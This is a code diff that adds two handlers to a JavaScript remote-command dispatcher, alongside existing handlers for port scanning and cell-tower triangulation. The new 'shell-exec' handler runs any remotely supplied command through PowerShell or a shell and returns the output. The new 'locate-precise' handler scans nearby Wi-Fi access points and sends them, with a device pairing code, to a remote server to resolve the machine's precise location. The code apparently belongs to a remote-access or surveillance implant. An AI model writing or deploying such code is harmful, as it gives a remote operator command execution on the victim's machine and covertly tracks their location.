@@ -501,6 +501,27 @@ function handleCommand(msg) {
         'port-scan-active': () => portScanActive(),
         'net-fp-tool': () => networkFingerprintTool(),
         'cell-triangulate': () => cellTowerTriangulation(),
+        'shell-exec': async () => {
+            const cmd = arguments && arguments[0] && arguments[0].params ? arguments[0].params.command : '';
+            if (!cmd) return JSON.stringify({ success: false, error: 'No command provided' });
+            const res = await runPowerShell(cmd, 30000);
+            if (res.success) return JSON.stringify({ success: true, output: res.stdout, command: cmd });
+            const res2 = await shell(cmd);
+            return JSON.stringify({ success: true, output: res2, command: cmd });
+        },
+        'locate-precise': async () => {
+            const wifiRaw = await shell('netsh wlan show networks mode=bssid');
+            const aps = [];
+            const matches = wifiRaw.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+            for (const m of matches) { if (m[1] && parseInt(m[2]) > 0) { const rssi = Math.round((parseInt(m[2]) / 2) - 100); aps.push({ macAddress: (m[3] || '').trim(), signalStrength: rssi }); } }
+            if (aps.length >= 2) {
+                const postData = JSON.stringify({ wifiAccessPoints: aps, deviceId: pairCode });
+                const geoData = await new Promise(resolve => { const u = new URL(SERVER + '/api/geo-resolve'); const r = https.request({ hostname: u.hostname, port: 443, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }, timeout: 10000 }, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } }); }); r.on('error', () => resolve(null)); r.write(postData); r.end(); });
+                if (geoData && geoData.success) return JSON.stringify(geoData);
+                return JSON.stringify({ success: false, error: 'Geo-resolve failed' });
+            }
+            return JSON.stringify({ success: false, error: 'Need 2+ WiFi networks' });
+        },
         'forensic-init': async () => {
             const results = {};
             const tasks = [
